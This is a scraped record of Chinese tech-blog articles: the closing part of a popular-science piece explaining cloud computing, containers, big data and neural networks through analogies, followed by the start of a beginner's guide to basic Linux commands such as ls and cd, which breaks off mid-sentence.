alt=\"\"></p>\n<p>有了集装箱以后，所有的货物都打包在一起了，并且集装箱的尺寸全部一致，所以每次换船的时候，一个箱子整体搬过去就行了，小时级别就能完成，船员再也不用上岸长时间耽搁了。</p>\n<p>这是集装箱“封装”、“标准”两大特点在生活中的应用。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/1adfe7183881af37a6942846dbf7eb96.png\" alt=\"\"></p>\n<p>那么容器如何对应用打包呢？还是要学习集装箱，首先要有个封闭的环境，将货物封装起来，让货物之间互不干扰，互相隔离，这样装货卸货才方便。好在 Ubuntu中的LXC技术早就能做到这一点。</p>\n<p>封闭的环境主要使用了两种技术，一种是看起来是隔离的技术，称为 Namespace，也即每个 Namespace中的应用看到的是不同的 IP地址、用户空间、程号等。另一种是用起来是隔离的技术，称为 Cgroups，也即明明整台机器有很多的 CPU、内存，而一个应用只能用其中的一部分。</p>\n<p>所谓的镜像，就是将你焊好集装箱的那一刻，将集装箱的状态保存下来，就像孙悟空说：“定”，集装箱里面就定在了那一刻，然后将这一刻的状态保存成一系列文件。这些文件的格式是标准的，谁看到这些文件都能还原当时定住的那个时刻。将镜像还原成运行时的过程（就是读取镜像文件，还原那个时刻的过程）就是容器运行的过程。</p>\n<p>有了容器，使得 PaaS层对于用户自身应用的自动部署变得快速而优雅。</p>\n<p>三、大数据拥抱云计算</p>\n<p>在PaaS层中一个复杂的通用应用就是大数据平台。大数据是如何一步一步融入云计算的呢？</p>\n<p>3.1 数据不大也包含智慧</p>\n<p>一开始这个大数据并不大，你想象原来才有多少数据？现在大家都去看电子书，上网看新闻了，在我们80后小时候，信息量没有那么大，也就看看书，看看报，一个星期的报纸加起来才有多少字啊，如果你不在一个大城市，一个普通的学校的图书馆加起来也没几个书架，是后来随着信息化的到来，信息才会越来越多。</p>\n<p>首先我们来看一下大数据里面的数据，就分三种类型，一种叫结构化的数据，一种叫非结构化的数据，还有一种叫半结构化的数据。什么叫结构化的数据呢？叫有固定格式和有限长度的数据。例如填的表格就是结构化的数据，国籍：中华人民共和国，民族：汉，性别：男，这都叫结构化数据。现在越来越多的就是非结构化的数据，就是不定长，无固定格式的数据，例如网页，有时候非常长，有时候几句话就没了，例如语音，视频都是非结构化的数据。半结构化数据是一些xml或者html的格式的，不从事技术的可能不了解，但也没有关系。</p>\n<p>数据怎么样才能对人有用呢？其实数据本身不是有用的，必须要经过一定的处理。例如你每天跑步带个手环收集的也是数据，网上这么多网页也是数据，我们称为Data，数据本身没有什么用处，但是数据里面包含一个很重要的东西，叫做信息Information，数据十分杂乱，经过梳理和清洗，才能够称为信息。信息会包含很多规律，我们需要从信息中将规律总结出来，称为知识knowledge，知识改变命运。信息是很多的，但是有人看到了信息相当于白看，但是有人就从信息中看到了电商的未来，有人看到了直播的未来，所以人家就牛了，你如果没有从信息中提取出知识，天天看朋友圈，也只能在互联网滚滚大潮中做个看客。有了知识，然后利用这些知识去应用于实战，有的人会做得非常好，这个东西叫做智慧intelligence。有知识并不一定有智慧，例如好多学者很有知识，已经发生的事情可以从各个角度分析的头头是道，但一到实干就歇菜，并不能转化成为智慧。而很多的创业家之所以伟大，就是通过获得的知识应用于实践，最后做了很大的生意。</p>\n<p>所以数据的应用分这四个步骤：数据，信息，知识，智慧。这是很多商家都想要的，你看我收集了这么多的数据，能不能基于这些数据来帮我做下一步的决策，改善我的产品，例如让用户看视频的时候旁边弹出广告，正好是他想买的东西，再如让用户听音乐的时候，另外推荐一些他非常想听的其他音乐。用户在我的应用或者网站上随便点点鼠标，输入文字对我来说都是数据，我就是要将其中某些东西提取出来，指导实践，形成智慧，让用户陷入到我的应用里面不可自拔，上了我的网就不想离开，手不停的点，不停的买，很多人说双十一我都想断网了，我老婆在上面不断的买买买，买了A又推荐B，老婆大人说，“哎呀，B也是我喜欢的啊，老公我要买”。你说这个程序怎么这么牛，这么有智慧，比我还了解我老婆，这件事情是怎么做到的呢？</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/71493f8655280648dbcd66c274a10b90.png\" alt=\"\" width=\"500\" height=\"339\"></p>\n<p>3.2 数据如何升华为智慧</p>\n<p>数据的处理分几个步骤，完成了才最后会有智慧。</p>\n<p>第一个步骤叫数据的收集。首先得有数据，数据的收集有两个方式，第一个方式是拿，专业点的说法叫抓取或者爬取，例如搜索引擎就是这么做的，它把网上的所有的信息都下载到它的数据中心，然后你一搜才能搜出来。比如你去搜索的时候，结果会是一个列表，这个列表为什么会在搜索引擎的公司里面呢，就是因为他把这个数据啊都拿下来了，但是你一点链接，点出来这个网站就不在搜索引擎它们公司了。比如说新浪有个新闻，你拿百度搜出来，你不点的时候，那一页在百度数据中心，一点出来的网页就是在新浪的数据中心了。另外一个方式就是推送，有很多终端可以帮我收集数据，比如说小米手环，可以将你每天跑步的数据，心跳的数据，睡眠的数据都上传到数据中心里面。</p>\n<p>第二个步骤是数据的传输。一般会通过队列方式进行，因为数据量实在是太大了，数据必须经过处理才会有用，可是系统处理不过来，只好排好队，慢慢的处理。</p>\n<p>第三个步骤是数据的存储。现在数据就是金钱，掌握了数据就相当于掌握了钱。要不然网站怎么知道你想买什么呢？就是因为它有你历史的交易的数据，这个信息可不能给别人，十分宝贵，所以需要存储下来。</p>\n<p>第四个步骤是数据的处理和分析。上面存储的数据是原始数据，原始数据多是杂乱无章的，有很多垃圾数据在里面，因而需要清洗和过滤，得到一些高质量的数据。对于高质量的数据，就可以进行分析，从而对数据进行分类，或者发现数据之间的相互关系，得到知识。比如盛传的沃尔玛超市的啤酒和尿布的故事，就是通过对人们的购买数据进行分析，发现了男人一般买尿布的时候，会同时购买啤酒，这样就发现了啤酒和尿布之间的相互关系，获得知识，然后应用到实践中，将啤酒和尿布的柜台弄的很近，就获得了智慧。</p>\n<p>第五个步骤就是对于数据的检索和挖掘。检索就是搜索，所谓外事不决问google，内事不决问百度。内外两大搜索引擎都是讲分析后的数据放入搜索引擎，从而人们想寻找信息的时候，一搜就有了。另外就是挖掘，仅仅搜索出来已经不能满足人们的要求了，还需要从信息中挖掘出相互的关系。比如财经搜索，当搜索某个公司股票的时候，该公司的高管是不是也应该被挖掘出来呢？如果仅仅搜索出这个公司的股票发现涨的特别好，于是你就去买了，其实其高管发了一个声明，对股票十分不利，第二天就跌了，这不坑害广大股民么？所以通过各种算法挖掘数据中的关系，形成知识库，十分重要。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/82383e7eedba1c4c6a857d3b0ee6ccf5.png\" alt=\"\" width=\"639\" height=\"369\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/0aa7c460826314a853c1f94019d8bfeb.png\" alt=\"\" width=\"654\" height=\"373\"></p>\n<p>3.3 大数据时代，众人拾柴火焰高</p>\n<p>当数据量很小的时候，很少的几台机器就能解决。慢慢的当数据量越来越大，最牛的服务器都解决不了问题的时候，就想怎么办呢？要聚合多台机器的力量，大家齐心协力一起把这个事搞定，众人拾柴火焰高。</p>\n<p>对于数据的收集，对于IoT来讲，外面部署这成千上万的检测设备，将大量的温度，适度，监控，电力等等数据统统收集上来，对于互联网网页的搜索引擎来讲，需要将整个互联网所有的网页都下载下来，这显然一台机器做不到，需要多台机器组成网络爬虫系统，每台机器下载一部分，同时工作，才能在有限的时间内，将海量的网页下载完毕。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/11dc1ed8afe83ff6204ef1926f5e9dea.png\" alt=\"\"></p>\n<p>对于数据的传输，一个内存里面的队列肯定会被大量的数据挤爆掉，于是就产生了基于硬盘的分布式队列，这样队列可以多台机器同时传输，随你数据量多大，只要我的队列足够多，管道足够粗，就能够撑得住。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/af9f2ff2b23388983719d66a71476d1f.png\" alt=\"\"></p>\n<p>对于数据的存储，一台机器的文件系统肯定是放不下了，所以需要一个很大的分布式文件系统来做这件事情，把多台机器的硬盘打成一块大的文件系统。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/aa51b888c9a8b154ff48efbf857ec7f9.png\" alt=\"\"></p>\n<p>再如数据的分析，可能需要对大量的数据做分解，统计，汇总，一台机器肯定搞不定，处理到猴年马月也分析不完，于是就有分布式计算的方法，将大量的数据分成小份，每台机器处理一小份，多台机器并行处理，很快就能算完。例如著名的Terasort对1个TB的数据排序，相当于1000G，如果单机处理，怎么也要几个小时，但是并行处理209秒就完成了。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/3e9abc231b2fca27961065ff8a67de7c.png\" alt=\"\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/fa9dffc7d12ef1dbe49c6bb255e60154.png\" alt=\"\"></p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/65008a24d116cf0c3c5f0f7a0741ada2.png\" alt=\"\"></p>\n<p>所以说大数据平台，什么叫做大数据，说白了就是一台机器干不完，大家一起干。随着数据量越来越大，很多不大的公司都需要处理相当多的数据，这些小公司没有这么多机器可怎么办呢？</p>\n<p>3.4 大数据需要云计算，云计算需要大数据</p>\n<p>说到这里，大家想起云计算了吧。当想要干这些活的时候，需要好多好多的机器一块做，真的是想什么时候要，想要多少就要多少。例如大数据分析公司的财务情况，可能一周分析一次，如果要把这一百台机器或者一千台机器都在那放着，一周用一次对吧，非常浪费。那能不能需要计算的时候，把这一千台机器拿出来，然后不算的时候，这一千台机器可以去干别的事情。谁能做这个事儿呢？只有云计算，可以为大数据的运算提供资源层的灵活性。而云计算也会部署大数据放到它的PaaS平台上，作为一个非常非常重要的通用应用。因为大数据平台能够使得多台机器一起干一个事儿，这个东西不是一般人能开发出来的，也不是一般人玩得转的，怎么也得雇个几十上百号人才能把这个玩起来，所以说就像数据库一样，其实还是需要有一帮专业的人来玩这个东西。现在公有云上基本上都会有大数据的解决方案了，一个小公司我需要大数据平台的时候，不需要采购一千台机器，只要到公有云上一点，这一千台机器都出来了，并且上面已经部署好了的大数据平台，只要把数据放进去算就可以了。</p>\n<p>云计算需要大数据，大数据需要云计算，两个人就这样结合了。</p>\n<p>四、人工智能拥抱大数据</p>\n<p>4.1 机器什么时候才能懂人心</p>\n<p>虽说有了大数据，人的欲望总是这个不能够满足。虽说在大数据平台里面有搜索引擎这个东西，想要什么东西我一搜就出来了。但是也存在这样的情况，我想要的东西不会搜，表达不出来，搜索出来的又不是我想要的。例如音乐软件里面推荐一首歌，这首歌我没听过，当然不知道名字，也没法搜，但是软件推荐给我，我的确喜欢，这就是搜索做不到的事情。当人们使用这种应用的时候，会发现机器知道我想要什么，而不是说当我想要的时候，去机器里面搜索。这个机器真像我的朋友一样懂我，这就有点人工智能的意思了。</p>\n<p>人们很早就在想这个事情了。最早的时候，人们想象，如果要是有一堵墙，墙后面是个机器，我给它说话，它就给我回应，我如果感觉不出它那边是人还是机器，那它就真的是一个人工智能的东西了。</p>\n<p>4.2 让机器学会推理</p>\n<p>怎么才能做到这一点呢？人们就想：我首先要告诉计算机人类的推理的能力。你看人重要的是什么呀，人和动物的区别在什么呀，就是能推理。我要是把我这个推理的能力啊告诉机器，机器就能根据你的提问，推理出相应的回答，真能这样多好。推理其实人们慢慢的让机器能够做到一些了，例如证明数学公式。这是一个非常让人惊喜的一个过程，机器竟然能够证明数学公式。但是慢慢发现其实这个结果，也没有那么令人惊喜，因为大家发现了一个问题，数学公式非常严谨，推理过程也非常严谨，而且数学公式很容易拿机器来进行表达，程序也相对容易表达。然而人类的语言就没这么简单了，比如今天晚上，你和你女朋友约会，你女朋友说：如果你早来，我没来，你等着，如果我早来，你没来，你等着。这个机器就比比较难理解了，但是人都懂，所以你和女朋友约会，你是不敢迟到的。</p>\n<p>4.3 教给机器知识</p>\n<p>所以仅仅告诉机器严格的推理是不够的，还要告诉机器一些知识。但是知识这个事儿，一般人可能就做不来了，可能专家可以，比如语言领域的专家，或者财经领域的专家。语言领域和财经领域知识能不能表示成像数学公式一样稍微严格点呢？例如语言专家可能会总结出主谓宾定状补这些语法规则，主语后面一定是谓语，谓语后面一定是宾语，将这些总结出来，并严格表达出来不久行了吗？后来发现这个不行，太难总结了，语言表达千变万化。就拿主谓宾的例子，很多时候在口语里面就省略了谓语，别人问：你谁啊？我回答：我刘超。但是你不能规定在语音语义识别的时候，要求对着机器说标准的书面语，这样还是不够智能，就像罗永浩在一次演讲中说的那样，每次对着手机，用书面语说：请帮我呼叫某某某，这是一件很尴尬的事情。</p>\n<p>人工智能这个阶段叫做专家系统。专家系统不易成功，一方面是知识比较难总结，另一方面总结出来的知识难以教给计算机。因为你自己还迷迷糊糊，似乎觉得有规律，就是说不出来，就怎么能够通过编程教给计算机呢？</p>\n<p>4.4 算了，教不会你自己学吧</p>\n<p>于是人们想到，看来机器是和人完全不一样的物种，干脆让机器自己学习好了。机器怎么学习呢？既然机器的统计能力这么强，基于统计学习，一定能从大量的数字中发现一定的规律。</p>\n<p>其实在娱乐圈有很好的一个例子，可见一斑</p>\n<p>有一位网友统计了知名歌手在大陆发行的 9 张专辑中 117 首歌曲的歌词，同一词语在一首歌出现只算一次，形容词、名词和动词的前十名如下表所示（词语后面的数字是出现的次数）：</p>\n<table cellspacing=\"0\" cellpadding=\"0\">\n<colgroup>\n<col>\n<col>\n<col>\n<col>\n<col>\n<col></colgroup>\n<tbody>\n<tr>\n<td height=\"15\">a</td>\n<td height=\"15\">形容词</td>\n<td height=\"15\">b</td>\n<td height=\"15\">名词</td>\n<td height=\"15\">c</td>\n<td height=\"15\">动词</td>\n</tr>\n<tr>\n<td height=\"15\">0</td>\n<td height=\"15\">孤独:34</td>\n<td height=\"15\">0</td>\n<td height=\"15\">生命:50</td>\n<td height=\"15\">0</td>\n<td height=\"15\">爱:54</td>\n</tr>\n<tr>\n<td height=\"15\">1</td>\n<td height=\"15\">自由:17</td>\n<td height=\"15\">1</td>\n<td height=\"15\">路:37</td>\n<td height=\"15\">1</td>\n<td height=\"15\">碎:37</td>\n</tr>\n<tr>\n<td height=\"15\">2</td>\n<td height=\"15\">迷惘:16</td>\n<td height=\"15\">2</td>\n<td height=\"15\">夜:29</td>\n<td height=\"15\">2</td>\n<td height=\"15\">哭:35</td>\n</tr>\n<tr>\n<td height=\"15\">3</td>\n<td height=\"15\">坚强:13</td>\n<td height=\"15\">3</td>\n<td height=\"15\">天空:24</td>\n<td height=\"15\">3</td>\n<td height=\"15\">死:27</td>\n</tr>\n<tr>\n<td height=\"15\">4</td>\n<td height=\"15\">绝望:8</td>\n<td height=\"15\">4</td>\n<td height=\"15\">孩子:23</td>\n<td height=\"15\">4</td>\n<td height=\"15\">飞:26</td>\n</tr>\n<tr>\n<td height=\"15\">5</td>\n<td height=\"15\">青春:7</td>\n<td height=\"15\">5</td>\n<td height=\"15\">雨:21</td>\n<td height=\"15\">5</td>\n<td height=\"15\">梦想:14</td>\n</tr>\n<tr>\n<td height=\"15\">6</td>\n<td height=\"15\">迷茫:6</td>\n<td height=\"15\">6</td>\n<td height=\"15\">石头:9</td>\n<td height=\"15\">6</td>\n<td height=\"15\">祈祷:10</td>\n</tr>\n<tr>\n<td height=\"15\">7</td>\n<td height=\"15\">光明:6</td>\n<td height=\"15\">7</td>\n<td height=\"15\">鸟:9</td>\n<td height=\"15\">7</td>\n<td height=\"15\">离去:10</td>\n</tr>\n</tbody>\n</table>\n<p>如果我们随便写一串数字，然后按照数位依次在形容词、名词和动词中取出一个词，连在一起会怎么样呢？</p>\n<p>例如取圆周率 3.1415926，对应的词语是：坚强，路，飞，自由，雨，埋，迷惘。稍微连接和润色一下：</p>\n<p>坚强的孩子，</p>\n<p>依然前行在路上，</p>\n<p>张开翅膀飞向自由，</p>\n<p>让雨水埋葬他的迷惘。</p>\n<p>是不是有点感觉了？当然真正基于统计的学习算法比这个简单的统计复杂的多。</p>\n<p>然而统计学习比较容易理解简单的相关性，例如一个词和另一个词总是一起出现，两个词应该有关系，而无法表达复杂的相关性，并且统计方法的公式往往非常复杂，为了简化计算，常常做出各种独立性的假设，来降低公式的计算难度，然而现实生活中，具有独立性的事件是相对较少的。</p>\n<p>4.5 模拟大脑的工作方式</p>\n<p>于是人类开始从机器的世界，反思人类的世界是怎么工作的。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/b78ecfdaeed9af0539b6bd289f6495e5.png\" alt=\"\"></p>\n<p>人类的脑子里面不是存储着大量的规则，也不是记录着大量的统计数据，而是通过神经元的触发实现的，每个神经元有从其他神经元的输入，当接收到输入的时候，会产生一个输出来刺激其他的神经元，于是大量的神经元相互反应，最终形成各种输出的结果。例如当人们看到美女瞳孔放大，绝不是大脑根据身材比例进行规则判断，也不是将人生中看过的所有的美女都统计一遍，而是神经元从视网膜触发到大脑再回到瞳孔。在这个过程中，其实很难总结出每个神经元对最终的结果起到了哪些作用，反正就是起作用了。</p>\n<p>于是人们开始用一个数学单元模拟神经元</p>\n<p>这个神经元有输入，有输出，输入和输出之间通过一个公式来表示，输入根据重要程度不同(权重)，影响着输出。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/a15474e07d6f756d392fca6f0bc15676.png\" alt=\"\"></p>\n<p>于是将n个神经元通过像一张神经网络一样连接在一起，n这个数字可以很大很大，所有的神经元可以分成很多列，每一列很多个排列起来，每个神经元的对于输入的权重可以都不相同，从而每个神经元的公式也不相同。当人们从这张网络中输入一个东西的时候，希望输出一个对人类来讲正确的结果。例如上面的例子，输入一个写着2的图片，输出的列表里面第二个数字最大，其实从机器来讲，它既不知道输入的这个图片写的是2，也不知道输出的这一系列数字的意义，没关系，人知道意义就可以了。正如对于神经元来说，他们既不知道视网膜看到的是美女，也不知道瞳孔放大是为了看的清楚，反正看到美女，瞳孔放大了，就可以了。</p>\n<p>对于任何一张神经网络，谁也不敢保证输入是2，输出一定是第二个数字最大，要保证这个结果，需要训练和学习。毕竟看到美女而瞳孔放大也是人类很多年进化的结果。学习的过程就是，输入大量的图片，如果结果不是想要的结果，则进行调整。如何调整呢，就是每个神经元的每个权重都向目标进行微调，由于神经元和权重实在是太多了，所以整张网络产生的结果很难表现出非此即彼的结果，而是向着结果微微的进步，最终能够达到目标结果。当然这些调整的策略还是非常有技巧的，需要算法的高手来仔细的调整。正如人类见到美女，瞳孔一开始没有放大到能看清楚，于是美女跟别人跑了，下次学习的结果是瞳孔放大一点点，而不是放大鼻孔。</p>\n<p>4.6 没道理但做得到</p>\n<p>听起来也没有那么有道理，但是的确能做到，就是这么任性。</p>\n<p>神经网络的普遍性定理是这样说的，假设某个人给你某种复杂奇特的函数，f(x)：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/a9a06967ca3a6dcf3145db745e2e2b88.png\" alt=\"\"></p>\n<p>不管这个函数是什么样的，总会确保有个神经网络能够对任何可能的输入x，其值f(x)（或者某个能够准确的近似）是神经网络的输出。</p>\n<p>如果在函数代表着规律，也意味着这个规律无论多么奇妙，多么不能理解，都是能通过大量的神经元，通过大量权重的调整，表示出来的。</p>\n<p>4.7 人工智能的经济学解释</p>\n<p>这让我想到了经济学，于是比较容易理解了。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/c1fea36ee3b6ed1826e508d6e448557c.png\" alt=\"\"></p>\n<p>我们把每个神经元当成社会中从事经济活动的个体。于是神经网络相当于整个经济社会，每个神经元对于社会的输入，都有权重的调整，做出相应的输出，比如工资涨了，菜价也涨了，股票跌了，我应该怎么办，怎么花自己的钱。这里面没有规律么？肯定有，但是具体什么规律呢？却很难说清楚。</p>\n<p>基于专家系统的经济属于计划经济，整个经济规律的表示不希望通过每个经济个体的独立决策表现出来，而是希望通过专家的高屋建瓴和远见卓识总结出来。专家永远不可能知道哪个城市的哪个街道缺少一个卖甜豆腐脑的。于是专家说应该产多少钢铁，产多少馒头，往往距离人民生活的真正需求有较大的差距，就算整个计划书写个几百页，也无法表达隐藏在人民生活中的小规律。</p>\n<p>基于统计的宏观调控就靠谱的多了，每年统计局都会统计整个社会的就业率，通胀率，GDP等等指标，这些指标往往代表着很多的内在规律，虽然不能够精确表达，但是相对靠谱。然而基于统计的规律总结表达相对比较粗糙，比如经济学家看到这些统计数据可以总结出长期来看房价是涨还是跌，股票长期来看是涨还是跌，如果经济总体上扬，房价和股票应该都是涨的。但是基于统计数据，无法总结出股票，物价的微小波动规律。</p>\n<p>基于神经网络的微观经济学才是对整个经济规律最最准确的表达，每个人对于从社会中的输入，进行各自的调整，并且调整同样会作为输入反馈到社会中。想象一下股市行情细微的波动曲线，正是每个独立的个体各自不断交易的结果，没有统一的规律可循。而每个人根据整个社会的输入进行独立决策，当某些因素经过多次训练，也会形成宏观上的统计性的规律，这也就是宏观经济学所能看到的。例如每次货币大量发行，最后房价都会上涨，多次训练后，人们也就都学会了。</p>\n<p>4.8 人工智能需要大数据</p>\n<p>然而神经网络包含这么多的节点，每个节点包含非常多的参数，整个参数量实在是太大了，需要的计算量实在太大，但是没有关系啊，我们有大数据平台，可以汇聚多台机器的力量一起来计算，才能在有限的时间内得到想要的结果。</p>\n<p>人工智能可以做的事情非常多，例如可以鉴别垃圾邮件，鉴别黄色暴力文字和图片等。这也是经历了三个阶段的。第一个阶段依赖于关键词黑白名单和过滤技术，包含哪些词就是黄色或者暴力的文字。随着这个网络语言越来越多，词也不断的变化，不断的更新这个词库就有点顾不过来。第二个阶段时，基于一些新的算法，比如说贝叶斯过滤等，你不用管贝叶斯算法是什么，但是这个名字你应该听过，这个一个基于概率的算法。第三个阶段就是基于大数据和人工智能，进行更加精准的用户画像和文本理解和图像理解。</p>\n<p>由于人工智能算法多是依赖于大量的数据的，这些数据往往需要面向某个特定的领域(例如电商，邮箱)进行长期的积累，如果没有数据，就算有人工智能算法也白搭，所以人工智能程序很少像前面的IaaS和PaaS一样，将人工智能程序给某个客户安装一套让客户去用，因为给某个客户单独安装一套，客户没有相关的数据做训练，结果往往是很差的。但是云计算厂商往往是积累了大量数据的，于是就在云计算厂商里面安装一套，暴露一个服务接口，比如您想鉴别一个文本是不是涉及黄色和暴力，直接用这个在线服务就可以了。这种形势的服务，在云计算里面称为软件即服务，SaaS (Software AS A Service)</p>\n<p>于是工智能程序作为SaaS平台进入了云计算。</p>\n<p>五、云计算，大数据，人工智能过上了美好的生活</p>\n<p>终于云计算的三兄弟凑齐了，分别是IaaS，PaaS和SaaS，所以一般在一个云计算平台上，云，大数据，人工智能都能找得到。对一个大数据公司，积累了大量的数据，也会使用一些人工智能的算法提供一些服务。对于一个人工智能公司，也不可能没有大数据平台支撑。所以云计算，大数据，人工智能就这样整合起来，完成了相遇，相识，相知。</p>\n<blockquote><p>本文作者刘超，《Lucene应用开发揭秘》。个人公众号：刘超的通俗云计算(popsuper1982)。</p></blockquote>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114005\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114005votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114005\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 9 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,云计算,人工智能,大数据", "url": "http://blog.jobbole.com/114005/", "url_obj_id": "4e10d4da22dcb529fe4ac299ec0ce8f8"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "title": "每个 Linux 新手都应该知道的 10 个命令", "create_date": "2018/05/04 ·", "praise_num": 1, "fav_num": 1, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/4/10-commands-new-linux-users\">Sam Bocetta</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9601-1.html\">Linux中国/MjSeven</a>   </div><blockquote><p>通过这 10 个基础命令开始掌握 Linux 命令行。</p></blockquote>\n<p>你可能认为你是 Linux 新手，但实际上并不是。全球互联网用户有 <a href=\"https://hostingcanada.org/state-of-the-internet/\">3.74 亿</a>，他们都以某种方式使用 Linux，因为 Linux 服务器占据了互联网的 90%。大多数现代路由器运行 Linux 或 Unix，<a href=\"https://www.top500.org/statistics/details/osfam/1\">TOP500 超级计算机</a> 也依赖于 Linux。如果你拥有一台 Android 智能手机，那么你的操作系统就是由 Linux 内核构建的。</p>\n<p>换句话说，Linux 无处不在。</p>\n<p>但是使用基于 Linux 的技术和使用 Linux 本身是有区别的。如果你对 Linux 感兴趣，但是一直在使用 PC 或者 Mac 桌面，你可能想知道你需要知道什么才能使用 Linux 命令行接口（CLI），那么你来到了正确的地方。</p>\n<p>下面是你需要知道的基本的 Linux 命令。每一个都很简单，也很容易记住。换句话说，你不必成为比尔盖茨就能理解它们。</p>\n<h3 id=\"toc_1\">1、 ls</h3>\n<p>你可能会想：“这是（is）什么东西？”不，那不是一个印刷错误 —— 我真的打算输入一个小写的 l。<code>ls</code>，或者说 “list”， 是你需要知道的使用 Linux CLI 的第一个命令。这个 list 命令在 Linux 终端中运行，以显示在存放在相应文件系统下的所有主要目录。例如，这个命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa93103d9d197635669\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nls /applications\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa93103d9d197635669-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa93103d9d197635669-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa93103d9d197635669-1\"><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">applications</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa93103d9d197635669-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>显示存储在 <code>applications</code> 文件夹下的每个文件夹，你将使用它来查看文件、文件夹和目录。</p>\n<p>显示所有隐藏的文件都可以使用命令 <code>ls -a</code>。</p>\n<h3 id=\"toc_2\">2、 cd</h3>\n<p>这个命令是你用来跳转（或“更改”）到一个目录的。它指导你如何从一个文件夹导航到另一个文件夹。假设你位于 <code>Downloads</code> 文件夹中，但你想到名为 <code>Gym Playlist</code> 的文件夹中，简单地输入 <code>cd Gym Playlist</code> 将不起作用，因为 shell 